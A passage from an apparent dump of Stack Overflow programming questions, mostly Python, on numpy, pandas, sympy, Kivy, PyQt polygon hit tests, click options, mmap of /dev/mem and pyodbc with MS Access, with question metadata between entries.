<p>I could concatenate the two files under a linux system by using <code>paste</code> in shell and I could cheat using <code>os.system</code>, i.e.:</p>

<pre><code>def concat_files_cheat(file_path, file1, file2, output_path, output):
    file1 = os.path.join(file_path, file1)
    file2 = os.path.join(file_path, file2)
    output = os.path.join(output_path, output)
    if not os.path.exists(output):
        os.system('paste ' + file1 + ' ' + file2 + ' &gt; ' + output)
</code></pre>

<p><strong>Method 2:</strong> Using nested context manager with <code>zip</code>:</p>

<pre><code>def concat_files_zip(file_path, file1, file2, output_path, output):
    with open(output, 'wb') as fout:
        with open(file1, 'rb') as fin1, open(file2, 'rb') as fin2:
            for line1, line2 in zip(fin1, fin2):
                fout.write(line1 + '\t' + line2)
</code></pre>

<p><strong>Method 3:</strong> Using <code>fileinput</code></p>

<p>Does <code>fileinput</code> iterate through the files in parallel? Or will they iterate through each file sequentially on after the other?</p>

<p>If it is the former, I would assume it would look like this:</p>

<pre><code>def concat_files_fileinput(file_path, file1, file2, output_path, output):
    with fileinput.input(files=(file1, file2)) as f:
        for line in f:
            line1, line2 = process(line)
            fout.write(line1 + '\t' + line2)
</code></pre>

<p><strong>Method 4</strong>: Treat them like <code>csv</code></p>

<pre><code>with open(output, 'wb') as fout:
    with open(file1, 'rb') as fin1, open(file2, 'rb') as fin2:
        writer = csv.writer(w)
        reader1, reader2 = csv.reader(fin1), csv.reader(fin2)
        for line1, line2 in zip(reader1, reader2):
          writer.writerow(line1 + '\t' + line2)
</code></pre>

<p>Given the data size, which would be the fastest? </p>

<p>Why would one choose one over the other? Would I lose or add information? </p>

<p>For each method how would I choose a different delimiter other than <code>,</code> or <code>\t</code>?</p>

<p>Are there other ways of achieving the same concatenation column wise? Are they as fast?</p>
"
40075164,5240945.0,2016-10-16 20:36:09+00:00,3,Determine mean value of âdataâ where the highest number of CONTINUOUS cond=True,"<p>I have a pandas Dataframe with a 'data' and 'cond'(-ition) column. I need the mean value (of the data column) of the rows with the highest number of CONTINUOUS True objects in 'cond'.  </p>

<pre><code>    Example DataFrame:

        cond  data
    0   True  0.20
    1  False  0.30
    2   True  0.90
    3   True  1.20
    4   True  2.30
    5  False  0.75
    6   True  0.80

    Result = 1.466, which is the mean value of row-indexes 2:4 with 3 True
</code></pre>

<p>I was not able to find a âvectorizedâ solution with a groupby or pivot method. So I wrote a func that loops the rows. Unfortunately this takes about an hour for 1 Million lines, which is way to long. Unfortunately, the @jit decoration does not reduce the duration measurably. </p>

<p>The data I want to analyze is from a monitoring project over one year and I have every 3 hours a DataFrame with one Million rows. Thus, about 3000 such files. </p>

<p>An efficient solution would be very important. I am also very grateful for a solution in numpy.  </p>
"
39673377,2330923.0,2016-09-24 06:42:51+00:00,3,How to extract rows from an numpy array based on the content?,"<p>As title, for example, I have an 2d numpy array, like the one below, </p>

<pre><code>[[33, 21, 1],
 [33, 21, 2],
 [32, 22, 0],
 [33, 21, 3],
 [34, 34, 1]]
</code></pre>

<p>and I want to extract these rows orderly based on the content in the first and the second column, in this case, I want to get 3 different 2d numpy arrays, as below, </p>

<pre><code>[[33, 21, 1],
 [33, 21, 2],
 [33, 21, 3]]
</code></pre>

<p>and </p>

<pre><code>[[32, 22, 0]]
</code></pre>

<p>and </p>

<pre><code>[[34, 34, 1]]
</code></pre>

<p>What function in numpy could I use to do this? I think the point is to distinguish different rows with their first and second columns. If elements in these columns are the same, then the specific rows are categorized in the same output array. <strong>I want to write a python function to do this kind of job, because I could have a much more bigger array than the one above.</strong> Feel free to give me advice, thank you.</p>
"
39894363,4126652.0,2016-10-06 11:08:18+00:00,3,Python checking equality of tuples,"<p>I have a numpy array of source and destination ip's</p>

<pre><code>consarray
array([['10.125.255.133', '104.244.42.130'],
   ['104.244.42.130', '10.125.255.133']], dtype=object)
</code></pre>

<p>The actual array is much larger than this.</p>

<p>I want to create a set of unique connection pairs from the array:</p>

<p>In the given eg: it is clear that both rows of the numpy array are part of same connection (Just src and destination are interchanged, so it is outgoing and incoming respectively).</p>

<p>I tried creating a set of unique tuples.
like this:</p>

<pre><code>conset = set(map(tuple,consarray))
conset
{('10.125.255.133', '104.244.42.130'), ('104.244.42.130', '10.125.255.133')}
</code></pre>

<p>What i actually want is for ('10.125.255.133', '104.244.42.130') and ('104.244.42.130', '10.125.255.133') to be considered the same so that only one of them will be in the set.</p>

<p>Can anyone tell me how do i go about doing this?</p>

<p><strong>EDIT:</strong></p>

<p>There have been some good answers, but actually i want another requirement,</p>

<p>I want that the first occurrence should always be the one retained irrespective of the ip address.</p>

<p>In the above example: ('10.125.255.133', '104.244.42.130') appears first, so it is the outgoing connection, i want to retain this.</p>

<p>If the above example changed to:</p>

<pre><code>consarray
array(['104.244.42.130', '10.125.255.133']],
    [['10.125.255.133', '104.244.42.130'],dtype=object)
</code></pre>

<p>I would want ('104.244.42.130', '10.125.255.133') to be retained.</p>
"
39942189,6944394.0,2016-10-09 09:48:54+00:00,3,How can I make an organized file into dictionary in python3?,"<p>I'm trying to make the file:</p>

<pre><code>c;f
b;d
a;c
c;e
d;g
a;b
e;d
f;g
f;d
</code></pre>

<p>Into a dict like</p>

<pre><code>{'e': {'d'}, 'a': {'b', 'c'}, 'd': {'g'}, 'b': {'d'}, 'c': {'f', 'e'}, 'f': {'g', 'd'}}.
</code></pre>

<p>The code I'm using now is like below</p>

<pre><code>def read_file(file : open) -&gt; {str:{str}}:
f = file.read().rstrip('\n').split()
answer = {}
for line in f:
    k, v = line.split(';')
    answer[k] = v
return answer
</code></pre>

<p>But it gives me <code>{'f': 'g', 'a': 'c', 'b': 'd', 'e': 'd', 'c': 'e', 'd': 'g'}</code>
How can I fix it?</p>
"
39868762,2410062.0,2016-10-05 08:17:09+00:00,3,Minimizing the sum of 3 variables subject to equality and integrality constraints,"<p>I am working on a programming (using Python) problem where I have to solve the following type of linear equation in 3 variables:</p>

<p>x, y, z are all integers.</p>

<p>Equation example:  <code>2x + 5y + 8z = 14</code></p>

<p>Condition: <code>Minimize x + y + z</code></p>

<p>I have been trying to search for an algorithm for finding a solution to this, in an optimum way. If anybody has any idea please guide me through algorithm or code-sources.</p>

<p>I am just curious, what can be done if this problem is extrapolated to n variables? </p>

<p>I don't want to use hit &amp; trial loops to keep checking for values. Also, there may be a scenario that equation has no solution. </p>

<p><strong>UPDATE</strong></p>

<p>Adding lower bounds condition:</p>

<pre><code>x, y, z &gt;= 0
x, y, z are natural
</code></pre>
"
39860431,74184.0,2016-10-04 19:38:00+00:00,3,Fast Python/Numpy Frequency-Severity Distribution Simulation,"<p>I'm looking for a away to simulate a classical frequency severity distribution, something like:
X = sum(i = 1..N, Y_i), where N is for example poisson distributed and Y lognormal.</p>

<p>Simple naive numpy script would be:</p>

<pre><code>import numpy as np
SIM_NUM = 3

X = []
for _i in range(SIM_NUM):
    nr_claims = np.random.poisson(1)
    temp = []
    for _j in range(nr_claims):
         temp.append(np.random.lognormal(0, 1))
    X.append(sum(temp))
</code></pre>

<p>Now I try to vectorize that for a performance increase. A bit better is the following:</p>

<pre><code>N = np.random.poisson(1, SIM_NUM)
X = []
for n in N:
    X.append(sum(np.random.lognormal(0, 1, n)))
</code></pre>

<p>My question is if I can still vectorize the second loop? For example by simulating all the losses with:</p>

<pre><code>N = np.random.poisson(1, SIM_NUM)
# print(N) would lead to something like [1 3 0]
losses = np.random.lognormal(0,1, sum(N))
# print(N) would lead to something like 
#[ 0.56750244  0.84161871  0.41567216  1.04311742]

# X should now be [ 0.56750244, 0.84161871 + 0.41567216 + 1.04311742, 0] 
</code></pre>

<p>Ideas that I have are ""smart slicing"" or ""matrix multiplication with A = [[1, 0, 0, 0]],[0,1,1,1],[0,0,0,0]]. But I couldn't make something clever out these ideas. </p>

<p>I'm looking for fastest possible computation of X.</p>
"
39941397,404099.0,2016-10-09 08:05:23+00:00,3,Maximum recursion depth exceeded at generator expression,"<p>In production I have code like the following:</p>

<pre><code>class Data(object):
    def __init__(self, data=None):
        self._data = data

    @property
    def is_loaded(self):
        return self._data is not None


def main():
    d = {0: Data(), 1: Data(1)}
    loaded = sum(1 for value in d.itervalues() if value.is_loaded)  # RuntimeError
    print loaded
</code></pre>

<p>Very rarely - my estimation about 1 in 10K runs - this fails at <code>sum()</code>; the error doesn't reproduce if run again with the same input:</p>

<pre><code>File ""module.py"", line 12, in main
  loaded = sum(1 for value in d.itervalues() if value.is_loaded)
File ""module.py"", line 12, in &lt;genexpr&gt;
  loaded = sum(1 for value in d.itervalues() if value.is_loaded)
RuntimeError: maximum recursion depth exceeded
</code></pre>

<p><strong>Questions</strong>: why this might happen, how to reproduce and debug this? Clearly I can rewrite <code>sum()</code> with a simple loop, but the error is intriguing...</p>

<p>For the reference: server runs CentOS 7.2.1511, x64, PyPy 5.1.1 (matches Python 2.7.10), the <a href=""https://bitbucket.org/squeaky/portable-pypy/downloads/pypy-5.1.1-linux_x86_64-portable.tar.bz2"" rel=""nofollow"">portable build</a>.</p>
"
39639342,6260170.0,2016-09-22 12:40:19+00:00,3,'None' is not displayed as I expected in Python interactive mode,"<p>I thought the display in Python interactive mode was always equivalent to <code>print(repr())</code>, but this is not so for <code>None</code>. Is this a language feature or am I missing something? Thank you</p>

<pre><code>&gt;&gt;&gt; None
&gt;&gt;&gt; print(repr(None))
None
&gt;&gt;&gt;
</code></pre>
"
39860985,5869177.0,2016-10-04 20:14:20+00:00,3,Reformat a column to only first 5 characters,"<p>I am new to Python and I'm struggling with this section. There are about 25 columns in a text file and 50,000+ Rows. For one of the columns, #11 (<strong>ZIP</strong>), this column contains all the zip code values of customers in this format ""<strong>07598-XXXX</strong>"", I would only like to get the first 5, so ""<strong>07598</strong>"", I need to do this for the entire column but I'm confused based on my current logic how to write it.
So far my code is able to delete rows that contains certain strings and I am also using the '|' delimiter to format it nicely as a CSV.</p>

<p>State   | ZIP(#11) | Column 12| .... </p>

<hr>

<p>NY  | 60169-8547  | 98</p>

<p>NY  | 60169-8973  | 58</p>

<p>NY  | 11219-4598  | 25</p>

<p>NY  | 11219-8475  | 12</p>

<p>NY  | 20036-4879  | 56</p>

<p>How can I iterate through the ZIP column and just show the first 5 characters?
Thanks for the help!</p>

<pre><code>import csv

my_file_name = ""NVG.txt""
cleaned_file = ""cleanNVG.csv""
remove_words = ['INAC-EIM','-INAC','TO-INAC','TO_INAC','SHIP_TO-inac','SHIP_TOINAC']


with open(my_file_name, 'r', newline='') as infile, open(cleaned_file, 'w',newline='') as outfile:
    writer = csv.writer(outfile)
    for line in csv.reader(infile, delimiter='|'):
        if not any(remove_word in element for element in line for remove_word in remove_words):
         writer.writerow(line)
</code></pre>
"
40090235,841120.0,2016-10-17 15:25:25+00:00,3,Joining string of a columns over several index while keeping other colums,"<p>Here is an example data set:</p>

<pre><code>&gt;&gt;&gt; df1 = pandas.DataFrame({
    ""Name"": [""Alice"", ""Marie"", ""Smith"", ""Mallory"", ""Bob"", ""Doe""],
    ""City"": [""Seattle"", None, None, ""Portland"", None, None],
    ""Age"": [24, None, None, 26, None, None],
    ""Group"": [1, 1, 1, 2, 2, 2]})

&gt;&gt;&gt; df1
    Age      City  Group     Name
0  24.0   Seattle      1    Alice
1   NaN      None      1    Marie
2   NaN      None      1    Smith
3  26.0  Portland      2  Mallory
4   NaN      None      2      Bob
5   NaN      None      2      Doe
</code></pre>

<p>I would like to merge the Name column for all index of the same group while keeping the City and the Age wanting someting like:</p>

<pre><code>&gt;&gt;&gt; df1_summarised
    Age      City  Group     Name
0  24.0   Seattle      1    Alice Marie Smith
1  26.0  Portland      2    Mallory Bob Doe
</code></pre>

<p>I know those 2 columns (Age, City) will be NaN/None after the first index of a given group from the structure of my starting data. </p>

<p>I have tried the following:</p>

<pre><code>&gt;&gt;&gt; print(df1.groupby('Group')['Name'].apply(' '.join))
Group
1    Alice Marie Smith
2      Mallory Bob Doe
Name: Name, dtype: object
</code></pre>

<p>But I would like to keep the Age and City columns...</p>
"
39893006,2293705.0,2016-10-06 10:00:28+00:00,3,Inconsistent python mmap behaviour with /dev/mem,"<p>I've been working on a project in PHP which requires mmap'ing <code>/dev/mem</code> to gain access to the hardware peripheral registers.  As there's no native mmap, the simplest way I could think of to achieve this was to construct a python subprocess, which communicated with the PHP app via <code>stdin/stdout</code>.</p>

<p>I have run into a strange issue which only occurs while reading addresses, not writing them.  The subprocess functions correctly (for reading) with the following:</p>

<pre><code>mem.write(sys.stdin.read(length))
</code></pre>

<p>So, I expected that I could conversely write memory segments back to the parent using the following:</p>

<pre><code>sys.stdout.write(mem.read(length))
</code></pre>

<p>If I mmap a standard file, both commands work as expected (irrelevant of the length of read/write).  If I map the <code>/dev/mem</code> ""file,"" I get nonsense back during the read.  It's worth noting that the area I'm mapping is outside the physical memory address space and is used to access the peripheral registers.</p>

<p>The work-around I have in place is the following:</p>

<pre><code>for x in range(0, length / 4):
    sys.stdout.write(str(struct.pack('L', struct.unpack_from('L', mem, mem.tell())[0])))
    mem.seek(4, os.SEEK_CUR)
</code></pre>

<p>This makes the reads behave as expected.</p>

<p>What I can't understand is why reading from the address using <code>unpack_from</code> should see anything different to reading it directly.  The same (non-working) thing occurs if I try to just assign a read to a variable.</p>

<p>In case additional context is helpful, I'm running this on a Raspberry Pi/Debian 8. The file that contains the above issue is <a href=""https://github.com/calcinai/php-mmap/blob/master/subprocess/mmap-proxy.py#L27"" rel=""nofollow"">here</a>.  The project that uses it is <a href=""https://github.com/calcinai/phpi"" rel=""nofollow"">here</a>.</p>
"
40076274,7028164.0,2016-10-16 22:40:30+00:00,3,Kivy changing color of a custom button on press,"<p>Goes without saying that I am new to kivy, trying to write a simple GUI with triangular buttons (and I want them to be decent, not just images that are still a square canvas that be clicked off the triangular part). So I found this great code that makes a triangle and gets the clickable area. </p>

<p>Basically I just want it to change colors when pressed (and revert back when unpressed) and I'm too newbish to get that to work. </p>



<pre class=""lang-py prettyprint-override""><code>import kivy
from kivy.uix.behaviors.button import ButtonBehavior
from kivy.app import App
from kivy.uix.widget import Widget
from kivy.properties import ListProperty
from kivy.vector import Vector
from kivy.lang import Builder

Builder.load_string('''
&lt;TriangleButton&gt;:
    id: trianglething
    # example for doing a triangle
    # this will automatically recalculate pX from pos/size
    #p1: 0, 0
    #p2: self.width, 0
    #p3: self.width / 2, self.height
    # If you use a Widget instead of Scatter as base class, you need that:
    p1: self.pos
    p2: self.right, self.y
    p3: self.center_x, self.top

    # draw something
    canvas:
        Color:
            rgba: self.triangle_down_color
        Triangle:
            points: self.p1 + self.p2 + self.p3
''')

def point_inside_polygon(x, y, poly):
    '''Taken from http://www.ariel.com.au/a/python-point-int-poly.html
    '''
    n = len(poly)
    inside = False
    p1x = poly[0]
    p1y = poly[1]
    for i in range(0, n + 2, 2):
        p2x = poly[i % n]
        p2y = poly[(i + 1) % n]
        if y &gt; min(p1y, p2y):
            if y &lt;= max(p1y, p2y):
                if x &lt;= max(p1x, p2x):
                    if p1y != p2y:
                        xinters = (y - p1y) * (p2x - p1x) / (p2y - p1y) + p1x
                    if p1x == p2x or x &lt;= xinters:
                        inside = not inside
        p1x, p1y = p2x, p2y
    return inside

class TriangleButton(ButtonBehavior, Widget):
    triangle_down_color = ListProperty([1,1,1,1])
    p1 = ListProperty([0, 0])
    p2 = ListProperty([0, 0])
    p3 = ListProperty([0, 0])

    def changecolor(self, *args):
        print ""color""
        self.ids.trianglething.canvas.triangle_down_color = (1,0,1,1)

    def collide_point(self, x, y):
        x, y = self.to_local(x, y)
        return point_inside_polygon(x, y,
                self.p1 + self.p2 + self.p3)  

if __name__ == '__main__':
    from kivy.base import runTouchApp

    runTouchApp(TriangleButton(on_press=TriangleButton.changecolor,size_hint=(None,None)))
</code></pre>

<p>I'm thinking I just have this line wrong:</p>

<pre class=""lang-py prettyprint-override""><code>self.ids.trianglething.canvas.triangle_down_color = (1,0,1,1)
</code></pre>

<p>but heck I don't really know. Any help would be appreciated</p>
"
39861740,525959.0,2016-10-04 21:06:01+00:00,3,String or object compairson in Python 3.52,"<p>I am working on the exorcism.io clock exercise and I can not figure out why this test is failing. The results look identical and even have the same type.</p>

<p>Here is my code:</p>

<pre><code>class Clock:
    def __init__(self, h, m):
        self.h = h
        self.m = m
        self.adl = 0

    def make_time(self):
        s = self.h * 3600
        s += self.m * 60
        if self.adl: s += self.adl

        while s &gt; 86400:
            s -= 86400

        if s == 0:
            return '00:00'

        h = s // 3600

        if h:
            s -= h * 3600

        m = s // 60
        return '{:02d}:{:02d}'.format(h, m)

    def add(self, more):
        self.adl = more * 60
        return self.make_time()

    def __str__(self):
        return str(self.make_time()) # i don't think I need to do this

if __name__ == '__main__':
    cl1 = Clock(34, 37) #10:37
    cl2 = Clock(10, 37) #10:37
    print(type(cl2))
    print(cl2, cl1)
    print(cl2 == cl1) #false
</code></pre>
"
39861911,5104708.0,2016-10-04 21:17:51+00:00,3,Regular Expression Dot not working,"<p>So I'm trying to parse through a file and I have the following code:</p>

<pre><code>def learn_re(s):
pattern=re.compile(""[0-9]{2}:[0-9]{2}:[0-9]{2}.[0-9]{3} ."")
if pattern.match(s):
    return True
return False
</code></pre>

<p>This matches with ""01:01:01.123 â""; however, when I add in one more character, it fails to work. For example if I edit my code so that it's </p>

<pre><code>def learn_re(s):
pattern=re.compile(""[0-9]{2}:[0-9]{2}:[0-9]{2}.[0-9]{3} . C"")
if pattern.match(s):
    return True
return False
</code></pre>

<p>This fails to match with ""01:01:01.123 â C"" What's happening here? </p>
"
39846735,6487192.0,2016-10-04 07:38:44+00:00,3,Google Foobar Challenge 3 - Find the Access Codes,"<h1>Find the Access Codes</h1>

<p>Write a function answer(l) that takes a list of positive integers l and counts the number of ""lucky triples"" of (lst[i], lst[j], lst[k]) where i &lt; j &lt; k.  The length of l is between 2 and 2000 inclusive.  The elements of l are between 1 and 999999 inclusive.  The answer fits within a signed 32-bit integer. Some of the lists are purposely generated without any access codes to throw off spies, so if no triples are found, return 0. </p>

<p>For example, [1, 2, 3, 4, 5, 6] has the triples: [1, 2, 4], [1, 2, 6], [1, 3, 6], making the answer 3 total.</p>

<h1>Test cases</h1>

<p>Inputs:
    (int list) l = [1, 1, 1]
Output:
    (int) 1</p>

<p>Inputs:
    (int list) l = [1, 2, 3, 4, 5, 6]
Output:
    (int) 3</p>

<h1>My Attempt</h1>

<pre><code>from itertools import combinations

def answer(l):
    if len(l) &lt; 3:
        return 0
    found = 0
    for val in combinations(l,3):
        # Ordering Check
        if (val[0] &lt;= val[1] &lt;= val[2]) != True:
            continue
        # Answer Size Check against size of signed integer 32 bit
        if int(val[0].__str__() + val[1].__str__() + val[2].__str__()) &gt; 2147483647:
            continue
        # Division Check
        if (val[1] % val[1] != 0) or (val[2] % val[1] != 0):
            continue
        # Increment 'found' variable by one
        found += 1
    return found
</code></pre>
"
39866051,6824949.0,2016-10-05 05:30:01+00:00,3,sympy - symbolically solve equations with float power,"<p>Using sympy, I define the symbols,</p>

<pre><code>a, b, c = sympy.symbols(['a', 'b', 'c'])
</code></pre>

<p>Then, when I try to solve the following system of equations,</p>

<pre><code>sympy.solve([sympy.Eq(b - a**2.552 - c), sympy.Eq(a, 2)])
</code></pre>

<p>I get the solution,</p>

<pre><code>[{b: c + 5.86446702875684, a: 2.00000000000000}]
</code></pre>

<p>But, when I try to solve,</p>

<pre><code>sympy.solve([sympy.Eq(b - a**2.552 - c), sympy.Eq(b, 2)])
</code></pre>

<p>It just seems to keep running (for ~4hrs), with no solution. Any help would be appreciated!</p>
"
39900630,3783576.0,2016-10-06 15:57:51+00:00,3,PyObject_CallObject failing on bytearray method,"<p>In the following code I create a pointer to a PyObject, representing a bytearray,  using the Python C API. I then extract the method ""endswith"" from the bytearray and try to call it on the original bytearray itself, expecting it to return <code>Py_True.</code> However, it returns <code>NULL</code> and the program prints ""very sad"".</p>

<pre><code>#include&lt;Python.h&gt;
#include&lt;iostream&gt;
int main()
{
    Py_Initialize();
    //make a one-byte byte array
    PyObject* oneByteArray = PyByteArray_FromStringAndSize(""a"", 1);
    //get the method ""endswith"" from the object at oneByteArray
    PyObject* arrayEndsWith = PyObject_GetAttrString(oneByteArray, ""endswith"");
    //ask python if ""a"" ends with ""a""
    PyObject* shouldbetrue = PyObject_CallObject(arrayEndsWith, oneByteArray);

    if (shouldbetrue == Py_True) std::cout &lt;&lt; ""happy\n"";
    if(shouldbetrue == NULL)std::cout &lt;&lt; ""very sad\n"";

    Py_Finalize();
    return 0;
}
</code></pre>

<p>I have checked in Python that for bytearrays, <code>foo</code> and <code>bar</code>, <code>foo.endswith(bar)</code> returns a Boolean. I also added <code>PyCallable_Check(arrayEndsWith)</code> to the code above and verified that the object is callable. What is my mistake?</p>
"
39964555,851699.0,2016-10-10 18:30:02+00:00,3,numpy: efficiently add rows of a matrix,"<p>I have a matrix.  </p>

<pre><code>mat = array([
   [ 0,  1,  2,  3],
   [ 4,  5,  6,  7],
   [ 8,  9, 10, 11]
   ])
</code></pre>

<p>I'd like to get the sum of the rows at certain indices: eg.</p>

<pre><code>ixs = np.array([0,2,0,0,0,1,1])
</code></pre>

<p>I know I can compute the answer as:</p>

<pre><code>mat[ixs].sum(axis=0)
&gt; array([16, 23, 30, 37])
</code></pre>

<p>The problem is ixs may be very long, and I don't want to use all the memory to create the intermediate product mat[ixs], only to reduce it again with the sum.</p>

<p>I also know I could simply count up the indices and use multiplication instead. </p>

<pre><code>np.bincount(ixs, minlength=mat.shape[0).dot(mat)
&gt; array([16, 23, 30, 37])
</code></pre>

<p>But that will be expensive if my ixs are sparse. </p>

<p>I know about scipy's sparse matrices, and I suppose I could use them, but I'd prefer a pure numpy solution as sparse matrices are limited in various ways (such as only being 2-d)</p>

<p>So, is there a pure numpy way to merge the indexing and sum-reduction in this case?</p>

<h1>Conclusions:</h1>

<p>Thanks you Divakar and hpaulj for your very thorough responses.  By ""sparse"" I meant that most of the values in <code>range(w.shape[0])</code> are not in ixs.  Using that new definition (and with more realisitic data size, I re-ran Divakar tests, with some new funcitona dded :</p>

<pre><code>rng = np.random.RandomState(1234)
mat = rng.randn(1000, 500)
ixs = rng.choice(rng.randint(mat.shape[0], size=mat.shape[0]/10), size=1000)

# Divakar's solutions
In[42]: %timeit org_indexing_app(mat, ixs)
1000 loops, best of 3: 1.82 ms per loop
In[43]: %timeit org_bincount_app(mat, ixs)
The slowest run took 4.07 times longer than the fastest. This could mean that an intermediate result is being cached.
10000 loops, best of 3: 177 Âµs per loop
In[44]: %timeit indexing_modified_app(mat, ixs)
1000 loops, best of 3: 1.81 ms per loop
In[45]: %timeit bincount_modified_app(mat, ixs)
1000 loops, best of 3: 258 Âµs per loop
In[46]: %timeit simply_indexing_app(mat, ixs)
1000 loops, best of 3: 1.86 ms per loop
In[47]: %timeit take_app(mat, ixs)
1000 loops, best of 3: 1.82 ms per loop
In[48]: %timeit unq_mask_einsum_app(mat, ixs)
10 loops, best of 3: 58.2 ms per loop 
# hpaulj's solutions
In[53]: %timeit hpauljs_sparse_solution(mat, ixs)
The slowest run took 9.34 times longer than the fastest. This could mean that an intermediate result is being cached.
1000 loops, best of 3: 524 Âµs per loop
%timeit hpauljs_second_sparse_solution(mat, ixs)
100 loops, best of 3: 9.91 ms per loop
# Sparse version of original bincount solution (see below):
In[60]: %timeit sparse_bincount(mat, ixs)
10000 loops, best of 3: 71.7 Âµs per loop
</code></pre>

<p><strong>The winner</strong> in this case is the sparse version of the bincount solution.</p>

<pre><code>def sparse_bincount(mat, ixs):
    x = np.bincount(ixs)
    nonzeros, = np.nonzero(x)
    x[nonzeros].dot(mat[nonzeros])
</code></pre>
"
40064377,6891960.0,2016-10-15 21:24:43+00:00,3,Most Pythonic way to find/check items in a list with O(1) complexity?,"<p>The problem I'm facing is finding/checking items in a list with O(1) complexity. The following has a complexity of O(n):</p>

<pre><code>'foo' in list_bar
</code></pre>

<p>This has a complexity of O(n) because you are using the <code>in</code> keyword on a <code>list</code>. (Refer to <a href=""https://wiki.python.org/moin/TimeComplexity"" rel=""nofollow"">Python Time Complexity</a>)</p>

<p>However, if you use the <code>in</code> keyword on a <code>set</code>, it has a complexity of O(1).</p>

<p>The reason why I need to figure out O(1) complexity for a list, and not a set, is largely due to the need to account for duplicate items within the list.  Sets do not allow for duplicates.  A decent example would be :</p>

<pre><code>chars_available = ['h', 'e', 'l', 'o', 'o', 'z']
chars_needed = ['h', 'e', 'l', 'l', 'o']

def foo(chars_available, chars_needed):
    cpy_needed = list(chars_needed)
    for char in cpy_needed:
        if char in chars_available:
            chars_available.remove(char)
            chars_needed.remove(char)
        if not chars_needed: return True  # if chars_needed == []
    return False

foo(chars_available, chars_needed)
</code></pre>

<p>The example is not the focus here, so please try not to get sidetracked by it.  The focus is still trying to get O(1) complexity for finding items in a list.  How would I accomplish that pythonically?</p>

<p>(As extra credit, if you did want to show a better way of performing that operation in Python, pseudocode, or another language, I'd be happy to read it).</p>

<p>Thank you!</p>

<p><strong>Edit:</strong></p>

<p>In response to Ami Tavory's answer, I learned you can't make lists faster than O(n), but the suggestion for <code>collections.Counter()</code> helped solve the application I was working on. I'm uploading my faster solution for Stack Overflow, the performance was phenomenal! If I'm not mistaken (correct me if I'm wrong), it should be O(1) since it involves only hashable values and no loop iteration.</p>

<pre><code>from collections import Counter
chars_available = ['h', 'e', 'l', 'o', 'o', 'z']
chars_needed = ['h', 'e', 'l', 'l', 'o']

def foo(chars_available, chars_needed):
    counter_available = Counter(chars_available)
    counter_needed = Counter(chars_needed)
    out = counter_needed - counter_available
    if not list(out.elements()): return True
    else: return False

foo(chars_available, chars_needed)
</code></pre>

<p>Very fast, very pythonic! Thanks!</p>
"
40132771,3298319.0,2016-10-19 13:26:49+00:00,3,Rename python click argument,"<p>I have this chunk of code:</p>

<pre><code>import click

@click.option('--delete_thing', help=""Delete some things columns."", default=False)
def cmd_do_this(delete_thing=False):
    print ""I deleted the thing.""
</code></pre>

<p>I would like to rename the option variable in <code>--delete-thing</code>. But python does not allow dashes in variable names. Is there a way to write this kind of code? </p>

<pre><code>import click

@click.option('--delete-thing', help=""Delete some things columns."", default=False, store_variable=delete_thing)
    def cmd_do_this(delete_thing=False):
        print ""I deleted the thing.""
</code></pre>

<p>So <code>delete_thing</code> will be set to the value of <code>delete-thing</code></p>
"
39880209,1202863.0,2016-10-05 17:24:15+00:00,3,pandas dataseries - How to address difference in days,"<p>I have a pandas dataframe navTable whose index is a series of dates.</p>

<p>I needed to find the difference between the consecutive dates in index</p>

<pre><code>                 Delta  
2016-08-10       0.006619  
2016-08-12       0.006595  
2016-08-14       0.006595  
2016-08-17       0.006595  
2016-08-18       0.006595 
</code></pre>

<p>I want a new column <code>Days_Diff</code> which would give me difference in subsequent dates (in index). Therefore my output should look like this</p>

<pre><code>             Delta      Delta_Days
8/10/2016   0.006619    None 
8/12/2016   0.006595    2 
8/14/2016   0.006595    2 
8/17/2016   0.006595    3 
8/18/2016   0.006595    1 
</code></pre>

<p>I tried this first:</p>

<pre><code>navTable['Index'] = navTable.index
navTable['Days_Diff'] = navTable['Index'] - navTable['Index'].shift(1)
navTable['Delta_Days'] = navTable['Days_Diff'].days
</code></pre>

<p>Outright, this was not accepted as it was complaining about ""days cannot be applied on Series""</p>

<p>So, I tried this:</p>

<pre><code>navTable['Index'] = navTable.index
navTable['Days_Diff'] = navTable['Index'] - navTable['Index'].shift(1)
navTable['Delta_Days'] = [ eachDayDiff.days for eachDayDiff in list(dataTable['Days_Diff']) ]
</code></pre>

<p>Understandably, it is complaining about the first element with is <code>Null</code>. </p>

<blockquote>
  <p>'NaTType' object has no attribute 'days'</p>
</blockquote>

<p>Question 1) Am I handling this scenario efficiently?
Question 2) How to I address </p>

<blockquote>
  <p>'NaTType' object has no attribute 'days'</p>
</blockquote>

<p>For the record, first element is of type <code>pandas.tslib.NaTType</code>
Rest are of type <code>pandas.tslib.Timedelta</code></p>

<p>Edit: formatting</p>
"
40100733,7034676.0,2016-10-18 06:07:33+00:00,3,Finding if a QPolygon contains a QPoint - Not giving expected results,"<p>I am working on a program in PyQt and creating a widget that displays a grid and a set of polygons on that grid that you are able to move around and click on. When I try to implement the clicking of the polygon, it does not seem to work. Below is the function that does not work: </p>

<pre><code>def mouseMoveCustom(self, e):
    for poly in reversed(self.polys):
        if poly.contains(e.pos()):
            self.cur_poly = poly
            self.setCursor(Qt.PointingHandCursor)
            print('mouse cursor in polygon')
            break
        else:
            self.setCursor(Qt.CrossCursor)
</code></pre>

<p>For context, <code>self.polys</code> is a list of <code>QPolygons</code> and <code>e.pos()</code> is the mouse position. I have tried entering </p>

<pre><code>print(poly)
print(poly.contains(QPoint(1,1)))
</code></pre>

<p>to test if it would work for a control point, but in the console, it only gives me this:</p>

<pre><code>&lt;PySide.QtGui.QPolygon(QPoint(50,350) QPoint(50,0) QPoint(0,0) QPoint(0,350) )  at 0x000000000547D608&gt;
False
</code></pre>

<p>Is there something I am doing wrong here, or how can I convert the above ""polygon"" into an actual <code>QPolygon</code> that I can work with?</p>

<p><strong>EDIT:</strong></p>

<p>This is the code used to generate the list <code>self.polys</code>:</p>

<pre><code>self.polys.append(QPolygon([QPoint(points[i][X]+self.transform[X], points[i][Y]+self.transform[Y]) for i in range(len(points))]))
</code></pre>

<p>Could it perhaps be a problem with using an inline for loop to add the <code>QPolygons</code> to the list?</p>
"
39661582,6870258.0,2016-09-23 13:07:23+00:00,3,How to create permanent MS Access Query by Python 3.5.1?,"<p>I have about 40 MS Access Databases and have some troubles if need to create or transfer one of MS Access Query (like object) from one db to other dbs.
So I tried to solve this problem with <code>pyodbc</code> but.. as I saw <code>pyodbc</code> doesn't support to create new, permanent MS Access Query (object).
I can connect to db, create or delete tables/rows but can't to create and save new query.</p>

<pre><code>import pyodbc

odbc_driver = r""{Microsoft Access Driver (*.mdb, *.accdb)}""

